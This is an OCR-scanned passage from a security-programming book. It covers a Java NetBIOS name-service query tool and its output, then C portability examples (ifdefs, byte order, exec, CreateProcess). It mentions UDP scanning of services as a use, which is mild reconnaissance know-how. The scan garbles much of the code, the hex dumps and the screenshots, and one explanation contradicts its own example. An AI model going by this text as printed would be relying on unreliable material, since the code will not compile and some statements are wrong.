4f 52 4b 47 52 4f 55 50 20 20 20 20 20 20 le C4 ORKGROUP 
00 57 49 4e 32 4b 54 45 53 54 31 53 50 33 20 20 .WIN2KTEST1SP3. . 
03 44 00 49 4e 65 74 7e 53 65 72 76 69 63 65 73 .D.INet.Services 
20 20 lc c4 00 49 53 7e 57 49 4e 32 4b 54 45 53 
IS.WIN2KTES 
54 31 53 50 33 44 00 41 44 4d 49 4e 49 53 54 52 T1SP3D.ADMINISTR 
41 54 4£ 52 20 20 03 44 00 00 50 56 40 4e 06 00 ATOR. . .D..PV@N., 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
oo oo oo oo oo oo oo oo oo oo oo oo oo oo oo oo 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
oo oo oo oo oo oo oo oo oo 
This program creates a NetBIOS overTCIVIP name service query packet, sends the 
packet to a remote host using the UDP protocol, receives the response, and then formats 
and prints the response to stdoM.This example is useful for demonstrating how to send 
and receive UDP datagrams using thejata.net package as well as for learning how to 
format received packets in an easy-to-read manner. 
Analysis 
At lines 12 and 13, thejava.net and Java.io packages are included into the pro-
gram, which makes the required DatagramSocket, Data gram Pa elect and 
InetAddress classes available. The Java.io package is also available And contains 
the required IOException class. 
At line 15. the NBTSTAT public class is declared. 
At line 17, the main static method for the NBTSTAT class is declared. 
At lines 19 through 25, the local variables used by the main method are 
declared. This includes a reference to the DatagramSocket class, which is used 
to send and receive UDP datagrams, and two Datagram Packet references, one 
to store the UDP datagram to be sent and one to store received UDP data-
grams. 

Java Sockets • Chapter 5 
215 
• 
At lines 29 through 35, the bytes of the N B T name service query are assigned 
to the bqry byte array variable.This is the complete N B T name service query 
packet in its raw byte form.The first two bytes are cast to type byte as the byte 
primitive data type is signed in the Java language, have a maximum value of 
127 and a minimum value of—128.The first two values, 0x81 and 0xd4, are 
greater than the maximum signed value of the data type resulting in the Java 
compiler widening the data types to the integer primitive data type and 
making them illegal for initialization of an array of type byte. The byte cast 
narrows the values to the byte primitive data type and eliminates the compila-
tion error. 
• 
At lines 38 through 45, the user-supplied command-line arguments are pro-
cessed.The NBSTAT program takes the IF address or hostname of the host to 
which the N B T name server query packet is sent as its only argument. 
• 
At line 52, the IP address supplied on the command line is converted to an 
InetAddress instance. This is required because the DatagramSocket constructor 
only accepts an InetAddress instance to define the IP address portion of the 
remote endpoint to which U D P datagrams are sent. 
• 
At line .54, an instance of the DatagramSocket class is created using the 
InetAddress instance created at line 52, and the port value of 137. Port 137 is 
the N B T name service port and (normally) is never found on a port other 
than 137. 
• 
At line 58, the DatagramSocket instance's connect() method is called. This 
method gets the socket ready for sending and receiving U D P datagrams. No 
connection negotiation is performed with the remote host when using the 
U D P protocol. 
• 
At line 61,an instance of the Datagram Packet class is created using the bytes of 
the N B T name service query byte array.The value of the byte array is what is 
sent to the remote host. 
• 
At line 64, the N B T name service query packet is sent to the remote host 
using the DatagramSocket send() method. 
• 
At line 67, an instance of the DatagramPacket class is created using the brsp 
byte array declared at line 24 for storage space. The next received U D P data-
gram is stored in the brsp byte array.The length of data received, as opposed to 
the length of the brsp array can be obtained by calling the DatagramPacket 
getLcngthQ method after a datagram has been received.The brsp byte array is 
declared with a size of OxFFEThe value OxFFFF is 65535 in base 10 and is the 
maximuni size for datagrams in the U D P protocol. Therefore, use of the size 
OxFFFF ensures that there will always be adequate space for received U D P 
datagrams in the byte array. 
• 
At line 70, the DatagramSocket receive() method is used to receive a response 
from the remote host. This method is blocking and will wait indefinitely for a 

216 
Chapter 5 • Java Sockets 
response. If a response is received, it is stored in the dprsp Data gram Packet 
instance. 
• 
At line 73, the DatagramSocket instance is closed. As opposed to the TCP pro-
tocol, no connection teardown occurs; the socket is simply closed and made 
unusable with no notification to remote hosts. 
• 
At lines 75 through 80, the received NBT name service reply packet is for-
matted and printed to stdout. 
Figure 5.4 displays the output of the NBTSTAT program as seen in Microsofts 
command shell. 
gure 5.4 NBTSTAT Program u 
|(]|C:\W[NNT\sh.exe 
CRIRFflKII 
j.m* 
NRTKIdT 
1 H . H _ 1 . R 1 
•HHt H B I 
o u e r y 
r e p l y 
( S 1 8 . Q . 1 . B 1 X 2 6 5 ) : 
B l 
d4 8 4 8 0 08 0 0 80 01 
0 0 80 0 0 0 0 20 
41 41 4 1 4 1 41 4 1 41 41 4 1 41 41 4 1 41 
41 41 4 1 4 1 41 4 1 41 41 4 1 41 41 4 1 41 
B0 01 
0 0 0 0 0B 0 0 00 bf 
08 
57 49 
4 B 
32 
5 3 
54 
31 
53 
58 
33 
20 20 00 44 00 5 7 49 
54 45 53 5 4 31 
53 
50 33 2 0 20 2 0 4 4 80 
4b 47 52 
4 f 
55 
5 0 20 28 2 0 20 2 0 2 0 80 
4F 
52 4 b 4 7 52 
4 f 
55 
5 0 2 0 20 2 0 2 0 20 
B0 57 49 4 e 
32 4 b 5 4 45 53 
54 31 
53 
50 
0 3 
44 0 0 4 9 
4 B 65 
74 
7 B 53 
65 
72 76 
69 
2 0 28 l c 
c 4 08 49 
53 
7 B 
5 7 49 
4 B 32 
4b 
54 31 
53 5 0 33 
4 4 00 41 
4 4 4d 49 
4 B 
49 
41 
54 I f 
5 2 
2B 2 0 B3 
44 0 0 00 5 0 56 
40 
0 0 08 0 0 8 0 88 0 0 88 88 0 0 88 08 0 0 88 
0 0 08 0 0 0 0 08 0 0 80 00 0 0 80 0 0 0 0 80 
0 0 88 0 0 8 0 08 0 0 88 00 0 0 80 0 0 0 0 00 
0 0 08 0 0 0 0 08 0 0 80 00 0 0 
CHIRPflStt 
po 
43 
41 
M8 
•lli 
4 c 
5 V 
c4 
2(1 
1.1 
(.3 
54 
53 
4i: 
08 
118 
08 
n Receiving NBT Name Service Reply 
4 b 
41 
4 1 
11 
0 0 
21 
5 4 
45 
32 
4h 
4 f 
52 
0 0 
57 
1 B 
C 4 
m 
?.H 
65 
73 
45 
53 
5 4 
52 
06 
88 
0 0 
08 
88 
88 
0 0 
08 
p^p^p^p^p^p^pjpjpjyjpjpj 
CKfl 
RRRFIRRRRRRRRnRRR 
HAAAAAAAAIIAAA... 
WIN2HTE 
S T 1 S P 3 . - . D . U [ N 2 K 
T E S T 1 S P 3 . . . D . W 0 R 
KGROUP 
W 
ORKGROUF 
. W ! N 2 K T E S T 1 S P 3 . . 
. D . [ N f i t . S e r v i c e s 
I S . W I N 2 K T E S 
T1SP3D.RDMINISTR 
R T O R . . . D . . P I I B N . . 
* 
-

Java Sockets * Chapter 5 
217 
Summary 
The Java Sockets API is a robust, simple, and easy-to-use means for implementing net-
work communication in client and server applications.TCP client socket programming 
is accessible using the Java Sockets API; requiring only knowledge of the Socket, 
Input Stream and OutputStream classes for the most basic implementation. More complex 
implementations can leverage any of the available I/O stream classes to handle TCP 
streams in unique and interesting ways. TCP server socket programming is also a 
straightforward process. The ScrverSocket class provides an easy-to-use API and leverages 
the already-familiar Socket class to represent new client connections.TCP server imple-
mentations can choose various methods to optimize the handling of new connections 
including handling them serially or using multiple threads and/or a thread pool. 
TCP client and server socket programming using the Java language may be com-
bined to quickly develop interesting utilities related to general network computing, and 
more specifically the information security field. A simple local monitoring program such 
as WormCakhcr can be expanded upon to monitor for many other types ofTCP-based 
probes or attacks. UDP socket programming is also quite accessible. Using the 
DatagramSocket and DatagramPackct classes provided by the jam.net package, it takes no 
much more than ten lines to implement a basic UDP-enabled program. 
UDP socket programming can be used to write generally useful applications, but is 
particularly useful for network scanning and identification of services including the 
Microsoft SQL Server Resolution Protocol on UDP port 1434, the Microsoft NetBIOS 
Name Server on UDP port 137, multiple UNIX RPC services, and other common 
UNIX, Linux, and Microsoft services. 
Solutions Fast Track 
TCP Clients 
0 
TCP client socket programming is simple using the java.net package, since only 
a single class (Socket) is used to create and manage the details of newTCP 
connections. 
0 Data is transferred to and from the socket using the standard InputStream and 
OutputStream classes located in the Java. io package. 
TCP Servers 
0 A single class (ServerSocket) is used to create and manage TCP client socket 
connections. The ServerSocket then binds to a port and waits for new TCP 
client connections. 
www.syngress.com 

218 
Chapter 5 • Java Sockets 
0 
When a new TCP client connection is received, an instance of the Socket class 
is created by the ServcrSockct instance, and is used to communicate with the 
remote client. The ServcrSockct class provides several constructors and methods 
useful for binding a TCP server socket to a local IP address and port. 
UDP Clients and Servers 
0 
In most cases, UDP socket programming is more straightforward than TCP 
sockets, since only a single byte array buffer is used to store data to be sent or 
received. 
0 The Datagram Packet class manages the byte array buffer that houses the data 
and a single instance of the DatagramSocket class is used to both send and 
receive DatagramPacket instances, or more accurately, the byte arrays managed 
by them. 
0 In the case of a UDP server socket, an instance of the DatagrauiSocket class is 
bound to a port using an API similar to that of the ServerSocket class. 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQs at ITFAQnet.com. 
Q: What are some of the advantages of usingjava instead of C or C++? 
A; The main benefit to using the Java sockets API is that it is portable across multiple 
platforms, simple to use, provides a rich set of APIs for performing higher-level 
operations such as HTTP requests, and is largely free from the risk of buffer over-
flow and memory overwrite bugs. 
Q: Can I use raw sockets with the Java sockets programming interface? 
A: The standard Java sockets programming interface does not provide the capability to 
read or write data over a raw socket. The programmer can implement this by using 
the Java Native Interface (JNI) interface for bridging native code with Java code. A 
raw sockets library can be developed in the C or C++ programming languages and 
then "wrapped" by a Java class and exposed to a Java program. 
For an excellent reference on JNI development, see: Java™ Native Interface: 
Programmer's Guide and Specification; Sheng Liang; Addison Wesley. 
www.syngress.com 

Java Sockets * Chapter 5 
219 
Q: Is there a simple way to perform SSL-enabled HTTP requests using the Java Sockets 
API? 
A: As of Java 1.4, the URLConnection class is SSL-aware. Simply supply the https:// 
prefix to the URL to be requested and the request is treated as an SSL-enabled 
request. Also, the javax.net.ssl. * package can be used to manually perform an SSL-
enabled request at the socket-level. 
Ql Where can I learn more about Java sockets programming? 
Ai An abundance of information on the Java runtime and programming APIs is avail-
able at the Java homepage: http://java.sun.com. 
Recommended reading includes: The Java" Virtual Machine Specification; Tom 
Lindholm, FrankYellin; Addison Wesley; Tliejava Programming Language; Ken Arnold, 
James Gosling. 
Ql If C and C++ are platform-dependent, do I need to rewrite all the code for each 
target system? 
Al Significant portions of C and C++ code do not need to be modified when ported to 
new platforms. Code that handles internal program flow and logic will usually work 
on multiple systems, with re compilation. Code needs to be modified if it makes system 
calls or interacts with the underlying hardware on a low level. 
Q: How do I go about writing an interpreter or my own scripting language' 
A: The answer to this question is not simplc.Java has become the language of choice for 
creating quick interpreters for applications requiring a custom scripting environment. 
Obviously, just about any other structured programming language would do and some 
have gone as far as implementing a scripting environment from within another 
scripting environment. This is not usually a good choice, especially considering the 
layers of execution that the script must go through. Assume someone chose to write a 
scripting environment within Perl. That means each new script would be have to be 
executed by the custom interpreter, which in turn is being executed by the Perl inter-
preter. Clearly this is inefficient. Our best answer to this question would be to use 
Google as a starting point for learning more. If you learn better from reading a book, 
then Writing Compilers and Interpreters by Ronald L. Mak is one of the best you will 
find. 
www.syngress.com 


Chapter 6 
Writing 
Portable Code 
Solutions in this Chapter: 
• 
UNIX and Microsoft Windows Porting Guide 
Related Chapters: Chapter 7 
j 
IZI Summary 
IZI Solutions Fast Track 
IZI Frequently Asked Questions 
221 
«
! 

222 
Chapter 6 • Writing Portable Code 
Introduction 
This chapter examines the multitudes of coding particulars that are used to create appli-
cations that will both compile and run on different operating systems. It also serves as a 
resource for finding the more popular features within a program and utilizing the pre-
sented examples. 
The first step in writing a program that runs on multiple systems and distinguishes 
which function to use (or more problematic, when to use differentiating platform-spe-
cific parameters with the same function), is to determine the underlying platform. A few 
of the more interesting methods for determining the operating system and using it to 
consistently direct the program are also discussed. 
After determining the operating system, process creation and management are dis-
cussed. UNIX forking and the Microsoft equivalent and file and directory handling and 
librarv usage are also analyzed. 
NOTE 
^
All of the example source code in this chapter was written and compiled using 
OpenBSD 3.2/x86 using the GNU C compiler version 2.95.3, the tcsh command 
shell version 6.12.00, and Microsoft Windows XP using Microsoft Visual 
Studio.NET 2002. 
UNIX and Microsoft 
Windows Porting Guide 
This section examines a number of UNIX application programming interfaces (APIs) 
and how to port them to the Windows platform. Emphasis is placed on porting APIs 
rather than the complete documentation of equivalent APIs for both platforms. 
Preference is given to APIs that are cross-platform-compatible rather than platform-
dependent.The selection of APIs is geared toward the development and porting of net-
work and host security tools. 
The topics discussed include process creation and termination, multithreading, sig-
nals, file handling, directory handling, Berkeley Software Distribution (BSD) sockets, 
packet capture (pcap), error handling, libraries, dynamic loading of libraries, 
daemon/Win32 service programming, memory management, command-line argument 
processing, integer data types, and conditional compilation. 
Pre-compiler Directives 
One of the most useful tools for developing cross-platform-compatible C and C++ 
source code is the ij'dcf family of pre-compiler directives. Using ifdcfi, it is possible to 
write source code that compiles differently depending on the platform it is compiled on. 

Writing Portable Code • Chapter 6 
223 
It is helpful to have source code compile differently, because many platforms have 
incompatible programming interfaces, header files, and data structures. Using ijdef, source 
code can be structured to use the correct values for the platform it is being compiled on. 
Using ifdefs 
The ifdef pre-compiler directives have almost the same form of if-etse statements as the C 
language, but are processed by the compiler before any C code.The directives include: 
#defi»e <iiiinw> <vahic> 
Uundcj<namc> 
#if <name> /== <vaine>j 
#ifdef <wlue> 
Uifndcf <valuc> 
#else 
Mif 
#endif 
The #deftne statement is used to define a value; its usage is simple: 
#denne NAME 
<value> 
#define EXAMPLE 
1234 
The Uitfidcf statement is used to undefine a previously defined value. 
tfundef EXAMPLE 
The #if statement is used to determine if a value has been defined and has a non-
zero value, or to compare defined values. The #if statement must be accompanied by a 
closing Uendif statement. 
#define EXAMPLE 1234 
#if EXAMPLE 
printf("EXAMPLE 
ia 
defined.\n-)j 
ftendif // 
• 
r e q u i r e d 
#endif 
The #if statement can also be used to compare values. 
#if EXAMPLE == 1234 
printf("EXAMPLE equals 1234!\n"); 
#endif 
The previous #if statement will evaluate to FALSE and nothing will be printed, 
because EXAMPLE was defined with a value of zero. 
#define EXAMPLE 1 

224 
Chapter 6 • Writing Portable Code 
tfif EXAMPLE 
printf("EXAMPLE 
is 
defined.\n"); 
#endif 
The previous #if statement will evaluate to TRUE, and EXAMPLE is defiiwd.\i will 
be printed because EXAMPLE was defined with a non-zero value. 
#if EXAMPLE == 1234 
printf("EXAMPLE equals 
1 2 3 4 . \ n " I ; 
ttendif 
The ttifdef statement is used to determine if a value has been defined. The #ifdef 
statement must also be accompanied by a closing ttendif statement. 
tfifdf 
EXAMPLE 
printf("EXAMPLE 
is 
defined.\n"); 
#endif 
The ttifiidcf statement is used to determine if a value has not been defined.The 
ttifhdef statement must also be accompanied by a closing ttendif statement. 
tfifndef 
EXAMPLE 
printf("EXAMPLE is not d e f i n e d . \ n - ) ; 
#endi£ 
The ttche statement is used in conjunction with ttifdef or ttifndef If either ttifdef or 
ttifndef do not evaluate to TRUE, the ttehe block of code will be used. 
ttifdef EXAMPLE 
printf("EXAMPLE is defined.\n"); 
#else 
printf("EXAMPLE is NOT defined.\n-); 
#endif 
The ttciif statement is used in conjunction with #if, ttifdef, or #0hdef to add to the 
list of conditions to check. 
tlifdef 
EXAMPLE_NUM1 

Writing Portable Code • Chapter 6 
print£("EXAMPLE_NUMl 
is defined.\n->; 
# e l i f 
EXAMPLE_NUM2 
printf("EXAMPLE_NUM2 is defined.\n"); 
#elif 
EXAMPLE_NUM3 
printf ("EXAMPLE_NUM3 is defined.\n-); 
ttendif 
Determining the Operating System 
Most operating systems or development environments define constants that can be used 
to determine the platform that code is to be compiled on.Table 6.1 includes a list of 
constants that can be used to detect some of the most common platforms. 
Table 6.1 Operating System Constants 
Operating System 
Constant 
Microsoft Wii 
OpenBSD 
FreeBSD 
NetBSD 
idows 
Apple MacOS X 
Linux 
Solaris 
WIN32 
_0pen BSD 
_FreeBSD_ 
_NetBSD_ 
_APPLE_ 
linux 
SOLARIS 
Example 6.1 demonstrates the use of //"rfc/"pre-compiler directives and defined con-
stants to conditionally compile the ifdcfl.c program depending for the OpenBSD or 
Microsoft Windows platforms. 
""fr"" Example 6.1 IFDEF (ifdef1.se) 
1 
i* 
2 
' 
ifdefl.c 
3 
* 
4 
* ifdef example program. 
5 
*/ 
6 
7 
# i n c l u d e 
< s t d i o , h > 
8 
9 
int 
10 
main(void) 
11 
{ 
12 
ttifdef 
OpenBSD 
13 
/* p r i n t out if compiled on OpenBSD */ 
1 4 
printf("OpenBSDXn"); 
15 
# e l i f 
WIN32 

226 
Chapter 6 • Writing Portable Code 
16 
/* print out if compiled on Win32 */ 
1 7 
printf(-WIN32\n" ) ; 
18 telse 
19 
printf ("?\n") ; 
20 tendif 
21 
22 
return(O) ; 
23 } 
Example Execution 
Lets look at the Win32 and UNIX output. 
Win32 Output 
C:\>ifdef1-exe 
WIN32 
UNIX Output 
obscB2# gcc -o ifdef1 ifdef1. c 
obsd32# ./ifdefl 
OpenBSD 
Analysis 
• 
At line 12, an //"rfefpre-compiler directive is used to determine if the operating 
system that the program is being compiled on is OpenBSD. If it is, the code at 
line 14 will be compiled, not the code at line 17. 
• 
At line 15, an ifdef pre-compiler directive is used to determine if the operating 
system that the program is being compiled on is a Win32 platform. If it is, the 
code at line 17 will be compiled, not the code at line 14. 
• 
At lines 14 and 16, the printfQ function is called to display either OpenBSD or 
WIN32, depending on the platform that the code is being compiled on. 
• 
At line 18, an else pre-compiler directive is used if the platform the code is 
being compiled on is either OpenBSD or Win32, 
Byte Ordering 
Many UNIX variants and older versions of Microsoft WindowsNT support a variety of 
processor architectures. Some of these architectures use different byte-ordering schemes 
to store and process integer data types.The most common types of byte ordering are 
little endian and big endian (see Example 6.2). Intel .v86 processors use little endian byte 
ordering, while most of the UNIX processors, including Scalable Processor Architecture 
(SPARC), MIPS, Precision Architecture Reduced Instruction Set Computing (PA-
RISC), and PowerPC, use big endian byte ordering. 

Writing Portable Code • Chapter 6 
227 
UNIX programming environments usually provide the endian.h header file and the 
BYTE_ORDER, LITTLE_ENDIAN, and BIG_ENDIAN constants to check the byte 
order of the host system at compile time. These constants are used in conjunction with 
the #if pre-compiler directive to conditionally compile any byte-order-dependent code. 
Example 6.2 Test-Byte Ordering (byteorderl.c) 
1 
f* 
2 
* byteorderl.c 
3 * 
4 * 
5 «/ 
6 
7 
ffinclude 
<sys/endian.h> 
8 
#include -cstdio ,h> 
9 
10 Int 
11 
main(void) 
12 { 
13 
#If BYTE_ORDER == LITTLE_ENDIAN 
14 
1 5 
printf("system is little endisn!\n"); 
16 
17 
flelif 
B¥TE_ORDER == B1G_ENDIAN 
18 
1 9 
printf("system is big endian,\n"); 
20 
21 #else 
22 
23 
printf ("not defined?\n") r-
24 
25 
Sendif 
26 
27 
return(O) ; 
28 ) 
Example Execution 
Let's look at the Win32 and UNIX output. 
Win32 Output 
C:\>byteorderl.exe 
system is little endianl 
UNIX Output 
obsd32fr gec -o byteorderl byteorderl.c 
cbsd32# ./byteorderl 
system is little endian! 

228 
Chapter 6 • Writing Portable Code 
Analysis 
• 
At line 13, an i/pre-compiler directive is used to determine if the previously 
defined constant BYTE_ORDER is equal to the value of the previously 
defined 
constant LITTLE_END1AN. 
• 
At line 17, an t/'pre-compiler directive is used to determine if the previously 
defined constant BYTE_ORDER is equal to the value of the previously 
defined constant BIG_ENDIAN. 
• 
At line 15, if the BYTE_ORDER constant is equal to UTTLE_ENDIAK the 
printf() function is called to display the system is Utile endian! string. 
• 
At line 19, if the BYTE_ORDER constant is equal to BIG_ENDIAN, the 
printf() function is called to display the "system is big endian, string. 
• 
At line 21, an else pre-compiler directive is used to print a message indicating 
that the BYTE_ORDER constant is not defined if the BYTE_ORDER con-
stant equals neither LITTLE_ENDIAN nor BIC^ENDIAN. 
The Microsoft Windows platform does not provide the endian.h header file or 
BYTE_ORDER constants. Programmers usually assume that the tittle endian byte order 
is being used (the Windows operating system is primarily used with little endian on Intel 
x86 hardware), assuming that little endian will introduce errors if code is compiled on 
non-Intel xH6 hardware. 
Example 6.3 demonstrates how to set the BYTE_ORDER constants if the target 
platform is assumed to be Windows on lit tie endian hardware: 
Example 6.3 Win32-Specific Byte Order Testing (byteorder2.c) 
1 
/• 
2 
* byteorder2.c 
3 
' 
4 
-
5 
v 
6 
7 
#include <stdio.h> 
8 
9 
int 
1 0 main{void) 
11 
{ 
12 
// if WIN32, ass ume l i t t l e endian 
13 
#ifdef WIN32 
14 
Itdefine LITTLE_ENDIAN 1234 
1 5 
Jfdefijie B¥TE_ORDER 
I,ITTLE_EMDIAN 
16 
Sendif 
17 
return(0) ; 
18 } 
Microsoft Visual C++ defines five macros that identify the hardware platform at 
compile time.These macros are: 
_M_IX86 
- x86 
_M_ALPKA - DEC Alpha 

Writing Portable Code • Chapter 6 
229 
_M_MPPC - Power Macintosh PowerPC 
_M_MRXO00 
- MIPS RXO00 
_M_PPC 
- PowerPC 
These macros can be used to further determine byte ordering on the Win32 plat-
form at compile time. 
Process Creation and Termination 
The UNIX and Windows process models differ significantly. UNIX operating systems 
typically follow a two-step method for creating new processes. First, the fork system call 
is used to create a near-duplicate of the calling process, but with a new process identi-
fier, and then the exec functions are used to overlay the executable image with the new 
executable image. 
In contrast to the two-step UNIX method, the Windows platform creates and loads 
new executable images in one step, using the Windows-specific Create Process function. 
Fortunately, the Win32 API provides a good level of compatibility with UNIX process 
creation, because it supports the Portable Operating System Interface (POS1X) standard 
family of exec functions; the fork system call is not supported. 
exec 
Example 6.4 demonstrates the use of the execv function to create a new process, which 
then replaces itself and executes the image of a second program. The exec.exe program is 
calling the execv; the program being run is execed.exe. 
Example 6.4 Program Executed by the execvO Function (execed.c) 
1 ,-
2 
* exececLc 
3 
* 
4 
* 
5 
v 
6 
7 
ffinclude <stdio.h> 
8 
9 
void 
10 
main(void) 
1 1 
c 
1 2 
printf{"exec'dlXrXn"); 
13 ) 
Example Execution 
Here is an example of the Win32 output. 
Win32 Output 
C:^Documents and Settings\Mike\ 
My Documents\Visual Studio Projects\exec\Debug>6Xeced 
exec'dI 

230 
Chapter 6 • Writing Portable Code 
Analysis 
At line 12, the print/Q function is called to display the exee'd! string. 
A program executed by the execvQ function (exec.c) is shown in Example 6.5. 
i s , H t " " Example 6.5 Program Executed by the execvQ Function (exec.c) 
1 
f * 
2 
* exec.c 
3 * 
4 • 
5 v 
6 
7 
tfinclude <stdio. h> 
8 
#include <;process-h;> 
9 
10 void 
11 main(void) 
12 ( 
13 
char *argv() = { "execed", MULL ); 
14 
15 
execv("execed-„ argv); 
16 
1 7 
printf("never reached<") , 
18 ) 
Example Execution 
Here is an example of the Win32 output. 
Win32 Output 
C:\Documents and Settings\Mike\ 
My Documents\Visual Studio ProjectsNexec\Debug>exec 
C:\Documents and Settings\Mike\ 
My DocumentsWisual Studio Projects\execVDebug?exec'dJ 
Analysis 
• 
At line 13, the arguments being passed to the example program 6.4, exceed, are 
initialized. The first argument is the name of the program itself; the second 
argument can be an optional list of environment variables. In this example, no 
environment variables are passed to the function. 
• 
At line 15, the execvQ function is called to create the exceed process. 
• 
At line 17, the printf() function is shown; however, because exeei'Q will replace 
the currently running process with the exee'd! process, the printfQ function will 
never be called. 
The exec.c program uses the cxccv function to replace itself with the execcd.c program; 
the execv function does not return. As such, the exec.c program starts and executes the 

Writing Portable Code • Chapter 6 
execed.exe program and exits. The code at line 17 of the exec.c program is not executed 
unless the execv function fails. (Note that the process.h header file is required to compile 
code that uses the execv function.) 
Using the Task Manager utility (tdskttigT.exe), it is possible to learn about how the 
execv function is implemented. If we modify the exec.c and exceed.c programs to include 
the windows.h header file and to call to the Win32 Sleep function, we can see that 
Windows creates a separate process for the executable image to be run on and termi-
nates the calling process; it does not overlay the existing process with the executable 
image to be run. 
\i r « £ Ft E S I EXc 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
imple 6.6 Program Executed by the execvO Function (execed2.c) 
t* 
* 
execed2.c 
* 
#include ^windows ,h> 
#include <^stdioTh> 
v o i d 
main(void) 
{ 
p r i n t f ( " e x e c ' d S I \ r \ n h ) ; 
SleepOOOO) ; 
} 
Is v tg t n E s s Example 6.7 Program Executed by the exec^O Function (execec!2x) 
1 i -
2 
* exec2.c 
3 
* 
4 • 
5 
v 
6 
7 &include <windows. h> 
8 #include <stdio.h> 
9 #include ^process. h> 
10 
11 void 
12 main(void) 
13 < 
14 
char *argv(] = ( "execetM", NULL ); 
15 
16 
SleepUOOO); 
17 
1 8 
execv(•execed2" H argv); 
19 
printfl"never reached.") ; 
20 ] 
Execution of the exec2,c and exceed!.c programs is the same as in Examples 6.6 and 
6.7, but this time, screen shots are taken to observe how the exceed 2. c program is exe-
cuted. First, the exec2 program is executed (see Figure 6.1): 

232 
Chapter 6 • Writing Portable Code 
C: \Documents and Sett ings\Syngress \ 
My DocumentsWisual Studio Projects\exec2\Debug>exec2 
Figure 6.1 Theexec2 Process Displayed in the Services Control Panel 
He 
Cptvn 
View 
Hefc 
AcGtetikarrt PTOCftiStfS | Pcttawnercc | telMKitng | 
InuoeNanw 
PID | 
AcotMi.e*e 
L53E 
AiroTriy.Crt 
:ilT0 
ACM.t** 
1W6 
•at>?*--• • e • * 
1164 
IK. 
- • - 
HOO 
( m m 
704 
davww.txfl 
Lido 
dflVflrw.HVfl 
L2*0 
* / « £ # / * 
1064 
*:.:fti*r.*rt 
L»4 
iMSi.f.t 
78+ 
^. -.• i 
L206 
mjrm^.pLe 
912 
p(^r> t « 
S96 
POtSFW.ei* 
1260 
P5P«Kerv.c^ 
[3l6 
•H'.'.I:-.C( 
6L6 
I"" S m p r K t S Q I rrcnJgKfi 
^ ^ ^ ^ M 
-
-
EndPHK«s 
ProwK*s:3$ 
CPUUsocje: H * * 
CWKT* Charge• 2*9* / 2l4lM 
The exceed2 program is then executed (see Figure 6.2): 
C:\Docwnents and Settings\Mike\ 
My DocumentsWisual Studio Projects\exec2\Debug>exec 'd2 ! 
Figure 6.2 Theexecec/2 Process Displayed in the Services Control Panel 
He 
CvtKra 
Ynw 
Met 
Apffctfgn* 
PrWSiMS IPerfgnrflf^clr^twwMigl 
[flags Hap* 
PIP I 
ft-:ro[ar #.* 
I53Z 
AcroTrav.ffXfl 
1076 
« * l . * . t 
19% 
o»d.s*e 
SAO 
tstsz.vxe 
TIM 
dtYmv.tx* 
1100 
* v f f i v . ™ 
12*0 
exscsdz.exe 
Z13Z 
opfcrer =.-« 
L364 
fwc*n-e*e 
60* 
is«s.SLt 
7&+ 
nrtfi.*rt 
I2DS 
insrmsTCXt 
012 
*r5PBnt.aye 
1920 
PER5FW.exe 
1260 
PGPiOSSftrv.ex* 
13 L6 
P^Pfrfly P I P 
1272 
~ 5ho*M p r « « * « ftorn al u5«i 
EndProan 
Pr««scs: *0 
CHJ tfMfle- 0% 
ft™* 
Chyge: J5SH/2+61M 
-
• 
Upon execution of the cATr2 program, excc2.exe is listed in the Task Manager with 
process identifier 7064. When the exceed2 program is executed, the exec2 process is 
removed from the task list and the cxcecd2.exe process is listed with a different process 
identifier of 2\}2. 
The Win32-specific Create Process function can be used to create a new process in 
place of the exec family of functions, 
Example 6.8 reimplements the exec.c program using the CreatcProccss function. 

Writing Portable Code • Chapter 6 
233 
rlt»„Esl Example 6.8 Program Executed by the CreateProcessO Function (exec_cp.c) 
1 f 
2 
* exec_cp.c 
3 * 
4 
-
5 
•/ 
6 
7 
#include ^windows ,h;> 
8 
9 
void 
10 
main(void) 
11 
{ 
1 2 
STARTUPINFO 
si ; 
13 
PROCESS_INFORMATION pi; 
14 
1 5 
GetSeartupInfof&si); 
16 
1 7 
CreateProcess("execed.exe", NULL, NULL, 
18 
MULL, FALSE, 0, NULL, MULL, Sal, ipi) ; 
19 > 
Example Execution 
Let's look at the Win32 output. 
Win32 Output 
C;^Documents and Settings\Mike\ 
My Documents\Visual Studio ProjectsVexec_cp\ Debug >-exec_cp 
C:\Documents and Settings\Mike\ 
My Documents\Visual Studio Projects\exec_cpVDebug>exec'dE 
Analysis 
• 
At lines 12 and 13, two variables are declared and initialized.These values are 
required by the CreotePtocessQ function. 
• 
At line 15, the Win32-specific GctStartupItifoQ function is called to populate 
the si variable. 
• 
At line 17, the Win32-specific CteateProcessQ function is called. This function 
executes the excccd.exe program as specified in the first parameter of the func-
tion. 
For more information on the Create Process function, search the 
http://msdu.microsoft.com Web site or Visual Studio documentation for "CreateProcess." 
fork 
The UNIX fork system call is typically used for one of two reasons: to create a new pro-
cess that executes an entirely different executable image, or to create a new process that 
continues executing a copy of the same executable image in coordination with its parent 

234 
Chapter 6 • Writing Portable Code 
process. In the first case, the CreateProcess function can be used to achieve similar results. 
In the second case, using threading is recommended for coordinating the execution of 
code in parallel. (Threading is discussed in the next section.) 
exit 
The UNIX exit system call is used to inunediately terminate a program. An equivalent 
function is available on the Windows platforms. Example 6.9 demonstrates use of the 
exit function: 
Example 6.9 Program Executed by the exitQ Function (exrt.c) 
i 
/* 
2 
* exit.c 
3 
* 
A 
* UNrx/win32 compatible 
5 
*/ 
6 
7 ft include -=stdlib.h> 
8 
9 
void 
10 
main^void) 
n 
i 
12 
e x i t ID); 
13 } 
Multithreading 
Most UNIX platforms provide rhe POSIX threads programming interface (pthreads), to 
support development of multithreaded applications.This interface can be used to create 
and coordinate multiple threads of execution within a single process.The Windows plat-
form also supports the multithreading of applications, but has a different programming 
interface. Fortunately, the two programming interfaces implement similar functionality 
and can be ported in a straightforward manner. 
Both programming interfaces provide functionality to create and control individual 
threads and to coordinate access between threads to shared resources. 
Thread Creation 
The pthreads function pthread_create is used to create a new thread of execution. 
Example 6.10 demonstrates the creation of a thread on the UNIX platform using 
pthreads. 
